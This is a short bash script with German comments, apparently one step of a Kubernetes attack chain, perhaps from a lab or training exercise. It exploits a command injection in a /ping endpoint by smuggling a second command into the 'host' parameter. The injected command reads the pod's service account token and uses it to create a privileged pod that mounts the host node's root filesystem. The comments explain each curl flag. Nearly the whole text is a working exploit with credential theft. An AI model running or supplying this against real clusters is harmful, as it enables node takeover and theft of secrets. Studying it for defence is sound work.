#!/usr/bin/env bash
# ==============================================================================
# 10. PRIVILEGE ESCALATION: PRIVILEGIERTEN POD ERSTELLEN
# ==============================================================================
# Der kompromittierte ServiceAccount besitzt die Berechtigung "create pods".
# Über die Command Injection weisen wir den Container an, eine POST-Anfrage
# an die interne Kubernetes-API (/api/v1/namespaces/default/pods) zu senden.
# Als Payload wird die Datei "/opt/privileged-pod.json" übergeben.
#
# Dieser Pod ("pwned-via-rbac") fordert "privileged: true" und mountet das
# Root-Dateisystem des Host-Nodes ("/host" -> "hostPath: /").
#
# Erklärung der curl-Parameter im Injektionsaufruf:
# -sk                                  : Silent & Insecure (ignoriert TLS-Zertifikat)
# -X POST                              : HTTP-POST-Methode zur Ressourcenerstellung
# -H "Authorization: Bearer $TOKEN"    : Authentifizierung mit gestohlenem SA-Token
# -H "Content-Type: application/json"  : JSON-Payload
# -d @/opt/privileged-pod.json         : Übergabe des bösartigen Pod-Manifests

curl -s -G "http://localhost:5000/ping" --data-urlencode \
  'host=127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sk -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d @/opt/privileged-pod.json https://kubernetes.default.svc/api/v1/namespaces/default/pods'
